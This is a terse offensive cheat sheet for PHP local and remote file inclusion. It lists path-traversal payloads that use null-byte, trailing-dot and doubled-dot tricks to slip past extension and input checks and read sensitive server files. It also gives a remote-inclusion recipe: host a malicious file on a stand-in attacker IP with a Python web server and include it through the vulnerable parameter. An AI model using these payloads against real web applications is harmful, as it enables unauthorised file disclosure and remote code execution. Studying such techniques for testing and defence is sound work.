LOCAL FILE INCLUSION :
    
    BYPASS FILE TYPE EXTENSION :

        IGNORE AFTER NULL BYTE : 
            
            URL/FunctionName?Parameter=../../Till_Reach_Root/Path/To/Sensitive_data_File%00
            URL/FunctionName?Parameter=../../Till_Reach_Root/Path/To/Sensitive_data_File0x00


    BYPASS RESTRICTION FILTER :
        
        CAUSE : functions like get_file_contents in PHP

        URL/FunctionName?Parameter=../../Till_Reach_Root/Path/To/Sensitive_data_File/.


    BYPASS INPUT VALIDATION :

        4 DOTS 2 SLASHES : URL/FunctionName?Parameter=....//....//Till_Reach_Root/Path/To/Sensitive_data_File


REMOTE FILE INCLUSION :

    REQUIREMENT : allow_url_fopen ON

    HOST SERVER AS ATTACKER WITH MALICIOUS FILE : python3 -m http.server PortNum

    http://Attacker_IP:PortNum/Path/To/Filename